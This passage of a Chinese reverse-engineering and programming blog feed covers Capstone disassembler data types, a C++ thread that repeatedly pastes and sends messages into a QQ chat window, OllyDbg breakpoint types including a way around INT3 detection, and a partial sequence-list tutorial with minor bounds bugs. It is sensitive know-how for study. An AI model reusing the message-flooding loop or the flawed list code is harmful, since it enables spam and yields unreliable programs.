cs_ac_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-group-type"><a href="#cs-group-type" class="headerlink" title="cs_group_type"></a>cs_group_type</h4><p>公共指令组，在所有架构中保持一致</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs_group_type &#123;</span><br><span class="line">CS_GRP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效指令组</span></span><br><span class="line">CS_GRP_JUMP,    <span class="comment">///&lt; 所有跳转指令(条件跳转+直接跳转+间接跳转)</span></span><br><span class="line">CS_GRP_CALL,    <span class="comment">///&lt; 所有调用指令</span></span><br><span class="line">CS_GRP_RET,     <span class="comment">///&lt; 所有返回指令</span></span><br><span class="line">CS_GRP_INT,     <span class="comment">///&lt; 所有中断指令(int+syscall)</span></span><br><span class="line">CS_GRP_IRET,    <span class="comment">///&lt; 所有中断返回指令</span></span><br><span class="line">CS_GRP_PRIVILEGE,    <span class="comment">///&lt; 所有特权指令</span></span><br><span class="line">CS_GRP_BRANCH_RELATIVE, <span class="comment">///&lt; 所有相关分支指令</span></span><br><span class="line">&#125; cs_group_type;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-opt-skipdata"><a href="#cs-opt-skipdata" class="headerlink" title="cs_opt_skipdata"></a>cs_opt_skipdata</h4><p>用户自定义设置SKIPDATA选项</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_skipdata</span> &#123;</span></span><br><span class="line"><span class="comment">/// Capstone认为要跳过的数据是特殊的“指令”</span></span><br><span class="line"><span class="comment">/// 用户可以在这里指定该指令的“助记符”字符串</span></span><br><span class="line"><span class="comment">/// 默认情况下(@mnemonic为NULL)， Capstone使用“.byte”</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户定义的回调函数，当Capstone命中数据时调用</span></span><br><span class="line"><span class="comment">/// 如果这个回调返回的值是正数(&gt;0)，Capstone将跳过这个字节数并继续。如果回调返回0,Capstone将停止反汇编并立即从cs_disasm()返回</span></span><br><span class="line"><span class="comment">/// 注意:如果这个回调指针为空，Capstone会根据架构跳过一些字节，如下所示:</span></span><br><span class="line"><span class="comment">/// Arm:     2 bytes (Thumb mode) or 4 bytes.</span></span><br><span class="line"><span class="comment">/// Arm64:   4 bytes.</span></span><br><span class="line"><span class="comment">/// Mips:    4 bytes.</span></span><br><span class="line"><span class="comment">/// M680x:   1 byte.</span></span><br><span class="line"><span class="comment">/// PowerPC: 4 bytes.</span></span><br><span class="line"><span class="comment">/// Sparc:   4 bytes.</span></span><br><span class="line"><span class="comment">/// SystemZ: 2 bytes.</span></span><br><span class="line"><span class="comment">/// X86:     1 bytes.</span></span><br><span class="line"><span class="comment">/// XCore:   2 bytes.</span></span><br><span class="line"><span class="comment">/// EVM:     1 bytes.</span></span><br><span class="line"><span class="keyword">cs_skipdata_cb_t</span> callback; <span class="comment">// 默认值为 NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户自定义数据将被传递给@callback函数指针</span></span><br><span class="line"><span class="keyword">void</span> *user_data;</span><br><span class="line">&#125; cs_opt_skipdata;</span><br></pre></td></tr></table></figure><blockquote><p>目前开放的API中未调用</p><h4 id="cs-detail"><a href="#cs-detail" class="headerlink" title="cs_detail"></a>cs_detail</h4><p>注意:只有当CS_OPT_DETAIL = CS_OPT_ON时，cs_detail中的所有信息才可用</p></blockquote><p>在arch/ARCH/ARCHDisassembler.c的ARCH_getInstruction中初始化为memset(., 0, offsetof(cs_detail, ARCH)+sizeof(cs_ARCH))</p><p>如果cs_detail发生了变化，特别是在union之后添加了字段，那么相应地更新arch/ arch/ archdisassembly .c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_detail</span> &#123;</span></span><br><span class="line"><span class="keyword">uint16_t</span> regs_read[<span class="number">12</span>]; <span class="comment">///&lt; 这个参数读取隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count; <span class="comment">///&lt; 这个参数读取隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> regs_write[<span class="number">20</span>]; <span class="comment">///&lt; 这个参数修改隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_write_count; <span class="comment">///&lt; 这个参数修改隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> groups[<span class="number">8</span>]; <span class="comment">///&lt; 此指令所属的指令组的列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> groups_count; <span class="comment">///&lt; 此指令所属的组的数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 特定于体系结构的信息</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">cs_x86 x86;     <span class="comment">///&lt; X86 架构, 包括 16-bit, 32-bit &amp; 64-bit 模式</span></span><br><span class="line">cs_arm64 arm64; <span class="comment">///&lt; ARM64 架构 (aka AArch64)</span></span><br><span class="line">cs_arm arm;     <span class="comment">///&lt; ARM 架构 (包括 Thumb/Thumb2)</span></span><br><span class="line">cs_m68k m68k;   <span class="comment">///&lt; M68K 架构</span></span><br><span class="line">cs_mips mips;   <span class="comment">///&lt; MIPS 架构</span></span><br><span class="line">cs_ppc ppc;    <span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">cs_sparc sparc; <span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">cs_sysz sysz;   <span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">cs_xcore xcore; <span class="comment">///&lt; XCore 架构</span></span><br><span class="line">cs_tms320c64x tms320c64x;  <span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">cs_m680x m680x; <span class="comment">///&lt; M680X 架构</span></span><br><span class="line">cs_evm evm;    <span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; cs_detail;</span><br></pre></td></tr></table></figure><h4 id="cs-insn"><a href="#cs-insn" class="headerlink" title="cs_insn"></a>cs_insn</h4><p>指令的详细信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_insn</span> &#123;</span></span><br><span class="line"><span class="comment">/// 指令ID(基本上是一个用于指令助记符的数字ID)</span></span><br><span class="line"><span class="comment">/// 应在相应架构的头文件中查找'[ARCH]_insn' enum中的指令id，如ARM.h中的'arm_insn'代表ARM, X86.h中的'x86_insn'代表X86等…</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="comment">/// 注意:在Skipdata模式下，这个id字段的“data”指令为0</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令地址 (EIP)</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令长度</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint16_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 此指令的机器码，其字节数由上面的@size表示</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint8_t</span> bytes[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令的Ascii文本助记符</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> mnemonic[CS_MNEMONIC_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令操作数的Ascii文本</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> op_str[<span class="number">160</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// cs_detail指针</span></span><br><span class="line"><span class="comment">/// 注意:只有同时满足以下两个要求时，detail指针才有效:</span></span><br><span class="line"><span class="comment">/// (1) CS_OP_DETAIL = CS_OPT_ON</span></span><br><span class="line"><span class="comment">/// (2) 引擎未处于Skipdata模式(CS_OP_SKIPDATA选项设置为CS_OPT_ON)</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// 注意2:当处于Skipdata模式或detail模式关闭时，即使这个指针不是NULL，它的内容仍然是不相关的。</span></span><br><span class="line">cs_detail *detail;</span><br><span class="line">&#125; cs_insn;</span><br></pre></td></tr></table></figure><h4 id="cs-err"><a href="#cs-err" class="headerlink" title="cs_err"></a>cs_err</h4><p>Capstone API遇到的各类型的错误时cs_errno()的返回值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> cs_err &#123;</span><br><span class="line">CS_ERR_OK = <span class="number">0</span>,   <span class="comment">///&lt; 无错误</span></span><br><span class="line">CS_ERR_MEM,      <span class="comment">///&lt; 内存不足: cs_open(), cs_disasm(), cs_disasm_iter()</span></span><br><span class="line">CS_ERR_ARCH,     <span class="comment">///&lt; 不支持的架构: cs_open()</span></span><br><span class="line">CS_ERR_HANDLE,   <span class="comment">///&lt;句柄不可用: cs_op_count(), cs_op_index()</span></span><br><span class="line">CS_ERR_CSH,      <span class="comment">///&lt; csh参数不可用: cs_close(), cs_errno(), cs_option()</span></span><br><span class="line">CS_ERR_MODE,     <span class="comment">///&lt; 无效的或不支持的模式: cs_open()</span></span><br><span class="line">CS_ERR_OPTION,   <span class="comment">///&lt; 无效的或不支持的选项: cs_option()</span></span><br><span class="line">CS_ERR_DETAIL,   <span class="comment">///&lt; 信息不可用，因为detail选项是关闭的</span></span><br><span class="line">CS_ERR_MEMSETUP, <span class="comment">///&lt; 动态内存管理未初始化(见 CS_OPT_MEM)</span></span><br><span class="line">CS_ERR_VERSION,  <span class="comment">///&lt; 不支持版本 (bindings)</span></span><br><span class="line">CS_ERR_DIET,     <span class="comment">///&lt; 在“diet”引擎中访问不相关的数据</span></span><br><span class="line">CS_ERR_SKIPDATA, <span class="comment">///&lt; 在SKIPDATA模式下访问与“数据”指令无关的数据</span></span><br><span class="line">CS_ERR_X86_ATT,  <span class="comment">///&lt; X86 AT&amp;T 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_INTEL, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_MASM, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">&#125; cs_err;</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-一&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-一&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(一)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C++调用线程实现QQ消息循环发送</title>
    <link href="https://kabeor.github.io/C++%E8%B0%83%E7%94%A8%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0QQ%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%91%E9%80%81/"/>
    <id>https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</id>
    <published>2019-04-24T11:35:50.051Z</published>
    <updated>2019-04-24T11:44:48.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-调用线程实现QQ消息循环发送"><a href="#C-调用线程实现QQ消息循环发送" class="headerlink" title="C++调用线程实现QQ消息循环发送"></a>C++调用线程实现QQ消息循环发送</h1><p>##函数原型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned long _beginthread(  </span><br><span class="line">             void(_cdecl *start_address)(void *), //声明为void (*start_address)(void *)形式  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             void *arglist //向线程传递的参数，一般为结构体</span><br><span class="line">           ); </span><br><span class="line"></span><br><span class="line">unsigned long _beginthreadex( //推荐使用   </span><br><span class="line">             void *security,//安全属性，NULL表示默认安全性  </span><br><span class="line">             unsigned stack_size, //是线程堆栈大小，一般默认为0  </span><br><span class="line">             unsigned(_stdcall  *start_address)(void *),//声明为unsigned(*start_address)(void *)形式  </span><br><span class="line">             void *argilist,//向线程传递的参数，一般为结构体  </span><br><span class="line">             unsigned initflag, //新线程的初始状态，0表示立即执行，CREATE_SUSPEND表示创建后挂起。  </span><br><span class="line">             unsigned *thrdaddr //该变量存放线程标识符，它是CreateThread函数中的线程ID。); //创建成功条件下的将线程句柄转化为unsigned long型返回，创建失败条件下返回0</span><br></pre></td></tr></table></figure></p><blockquote><p>使用_beginthreadex而不是CreateThread的原因</p></blockquote><p> _beginthreadex在内部调用了CreateThread，在调用之前_beginthreadex做了很多的工作，从而使得它比CreateThread更安全。</p><p>通常建议使用_beginthreadex函数，而不是CreateThread函数，这使得线程中的代码不需要考虑C/C++代码的线程安全性，除非你清楚地知道在新的线程中不会调用到线程不安全的C/C++代码，这时候放心地使用CreateThread也无可厚非(实际上这种情况很难判定)。_beginthreadex保证了某些C/C++运行库代码的线程安全性，而CreateThread没有对这些特殊的C/C++代码做出保证，这里再次强调这两个函数的区别。不要含糊地认为CreateThread的设计存在缺陷，CreateThread的功能并不专门针对于C/C++运行库，理所当然不必为其多线程安全性而负责。</p><p>##实现<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> _<span class="function">stdcall <span class="title">ThreadOne</span><span class="params">(<span class="keyword">void</span>* Parg)</span>                   <span class="comment">//stdcall自动平衡堆栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; j;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span> ; i &lt; j; i++)</span><br><span class="line">&#123;</span><br><span class="line">SendMessage((HWND)<span class="number">0x002401E8</span>, WM_PASTE, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">//获取窗口线程   获取剪切板内容</span></span><br><span class="line">        Sleep(<span class="number">300</span>);</span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                  <span class="comment">//模拟按下回车</span></span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);    <span class="comment">//模拟弹起回车</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="literal">NULL</span>,ThreadOne,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);        <span class="comment">//线程调用</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>From <a href="https://kabeor.github.io/C++调用线程实现QQ消息循环发送/">https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C-调用线程实现QQ消息循环发送&quot;&gt;&lt;a href=&quot;#C-调用线程实现QQ消息循环发送&quot; class=&quot;headerlink&quot; title=&quot;C++调用线程实现QQ消息循环发送&quot;&gt;&lt;/a&gt;C++调用线程实现QQ消息循环发送&lt;/h1&gt;&lt;p&gt;##函数原型&lt;br&gt;&lt;f
      
    
    </summary>
    
      <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
      <category term="C++多线程" scheme="https://kabeor.github.io/tags/C-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>OD常用断点</title>
    <link href="https://kabeor.github.io/OD%E5%B8%B8%E7%94%A8%E6%96%AD%E7%82%B9/"/>
    <id>https://kabeor.github.io/OD常用断点/</id>
    <published>2019-03-31T05:59:00.857Z</published>
    <updated>2019-03-20T13:34:16.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD常用断点"><a href="#OD常用断点" class="headerlink" title="OD常用断点"></a>OD常用断点</h1><h2 id="INT-3断点"><a href="#INT-3断点" class="headerlink" title="INT 3断点"></a>INT 3断点</h2><blockquote><p>原理： 当执行一个INT 3断点时，该地址处的内容被调试器用INT 3 指令替换，此时OD将INT 3隐藏，显示中断前的指令</p><p>INT 3机器码为0xCC<br>   <code>004013A5  CC D0404000</code><br>68被替换为CC</p></blockquote><p>INT3断点可设置无限个，但改变了程序机器码，容易被检测，如检测API首地址是否为0xCC。绕过方式，将断点设在函数内部或末尾。</p><p>F2或命令行 bp设置</p><h2 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h2><blockquote><p>原理<br>与DRx调试寄存器有关</p><p>Dr0~3用于设置硬件断点，即在调试器中经常使用的bpm断点，由于只有4个断点寄存器，所以最多只能设置4个bpm断点。Dr7是一些控制位，用于控制断点的方式，Dr6用于显示是哪些引起断点的原因。</p></blockquote><p><img src="https://i.loli.net/2019/02/14/5c64ea4e1430a.jpg" alt></p><p>硬件断点不会将指令首字节修改为CC</p><p>菜单Breakpoint  &gt; hardware,on execution 或命令行 “HE 地址”设置</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><blockquote><p>原理： 对所设的地址赋予不可访问/不可写入属性，当访问或写入时会产生异常，OD截获异常后比较是否是断点地址，如果是就中断。</p></blockquote><p>只能下一个内存断点<br>Breakpoint &gt; memory, on write/access设置，F9运行</p><p>硬件访问/写入断点在触发硬件断点的下一条指令处下断，内存断点在触发断点的指令处下断。</p><h2 id="内存访问一次性断点"><a href="#内存访问一次性断点" class="headerlink" title="内存访问一次性断点"></a>内存访问一次性断点</h2><p>ALT+M显示内存，在相应段上右键Set break-on-access或F2对整个内存块设置该类断点<br>这个断点是一次性断点，当所在段被读取或执行时中断，然后断点被删除</p><p>捕捉调用或返回某模块时使用。</p><h2 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h2><p>当某个特定窗口函数接收到特定消息时，消息断点将使程序中断。<br>INT 3断点可在程序启动前设置，消息断点只能在窗口被创建后设置并拦截消息。</p><p>运行窗口程序，菜单View &gt; Windows或W按钮，列出窗口相关参数，右键Actualize刷新。对应位置右键Message breakpoint on ClassProc进行设置。想要返回程序领空，应对.text段下内存访问断点。</p><h2 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h2><h3 id="寄存器条件中断"><a href="#寄存器条件中断" class="headerlink" title="寄存器条件中断"></a>寄存器条件中断</h3><p>Shift+F2</p><h3 id="存储器条件中断"><a href="#存储器条件中断" class="headerlink" title="存储器条件中断"></a>存储器条件中断</h3><p>标出各参数对应ESP地址 栈窗口右键Address &gt; Relative to ESP</p><p>相应API用Shift+F2设置断点</p><h3 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h3><p>Shift+F4</p><p>From <a href="https://kabeor.github.io/OD常用断点/">https://kabeor.github.io/OD常用断点/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OD常用断点&quot;&gt;&lt;a href=&quot;#OD常用断点&quot; class=&quot;headerlink&quot; title=&quot;OD常用断点&quot;&gt;&lt;/a&gt;OD常用断点&lt;/h1&gt;&lt;h2 id=&quot;INT-3断点&quot;&gt;&lt;a href=&quot;#INT-3断点&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>(Sequence List)顺序表算法分析</title>
    <link href="https://kabeor.github.io/(Sequence%20List)%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/(Sequence List)顺序表算法分析/</id>
    <published>2019-03-31T05:59:00.378Z</published>
    <updated>2019-04-24T11:30:38.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sequence-List-顺序表算法分析"><a href="#Sequence-List-顺序表算法分析" class="headerlink" title="(Sequence List)顺序表算法分析"></a>(Sequence List)顺序表算法分析</h1><h2 id="一-Struct实现"><a href="#一-Struct实现" class="headerlink" title="一 Struct实现"></a>一 Struct实现</h2><blockquote><p>动态存储分配<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INIT_SIZE 100  <span class="comment">//初始化顺序表最大容量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTINCREMENT 10    <span class="comment">//默认增加空间量</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* elem;         <span class="comment">//一维数组</span></span><br><span class="line">    <span class="keyword">int</span> length;         <span class="comment">//线性表当前长度</span></span><br><span class="line">    <span class="keyword">int</span> listsize;       <span class="comment">//当前数组容量</span></span><br><span class="line">    <span class="keyword">int</span> incrementsize;  <span class="comment">//增加空间量</span></span><br><span class="line">&#125; SqList;</span><br></pre></td></tr></table></figure></p><p>初始化</p></blockquote><p>构造一个空的顺序表L</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> maxsize = LIST_INIT_SIZE, <span class="keyword">int</span> incresize = LISTINCREMENT)</span></span></span><br><span class="line"><span class="function"></span>&#123;                                        <span class="comment">//构建最大容量maxsize的顺序表L</span></span><br><span class="line">    L.elem = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(maxsize * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));  <span class="comment">//申请内存</span></span><br><span class="line">    <span class="keyword">if</span> (!L.elem)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.listsize = maxsize;</span><br><span class="line">    L.incrementsize = incresize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>求表长</p></blockquote><p>返回当前顺序表L元素个数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength_Sq</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>查找元素</p></blockquote><p>从第一个元素起，一次和待查找元素e相比较，找到则返回该元素在L中的位序，查找成功；否则返回-1，查找失败。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(SqList L, <span class="keyword">char</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;      <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">if</span> (L.elem[i] == e)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>插入元素</p></blockquote><p>假设顺序表中有length个元素，在第i(0&lt;=i&lt;=length)个元素前插入新元素e时，需要将第length-1至第i个位置(共length-i个)依次后移，然后插入e到第i个位置，length加1，返回true。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListInsert_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> i, <span class="keyword">char</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (L.length &gt; L.listsize) &#123;</span><br><span class="line">        L.elem = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(L.elem, (L.listsize + L.incrementsize) * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">if</span> (!L.elem)</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        L.listsize += L.incrementsize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = L.length; j &gt; i; j--)      <span class="comment">//后移</span></span><br><span class="line">        L.elem[j] = L.elem[j - <span class="number">1</span>];</span><br><span class="line">    L.elem[i] = e;</span><br><span class="line">    L.length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>删除元素</p></blockquote><p>与插入相反，需要删除第i(0&lt;=i&lt;=length)个元素，将第i至第length-1个位置(共length-i个)依次前移，length减1，返回true。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListDetect_Sq</span><span class="params">(SqList&amp; L, <span class="keyword">int</span> i, <span class="keyword">char</span>&amp; e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (L.length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = L.elem[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= L.length - <span class="number">1</span>; j++)</span><br><span class="line">        L.elem[j - <span class="number">1</span>] = L.elem[j];</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取元素</p></blockquote><p>直接返回元素，不需要移动</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetElem_Sq</span><span class="params">(SqList L, <span class="keyword">int</span> i, <span class="keyword">char</span>&amp; e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (L.length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    e = L.elem[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>遍历表</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListTraverse_Sq</span><span class="params">(SqList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L.length; i++)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; L.elem[i] &lt;&lt; <span class="string">" 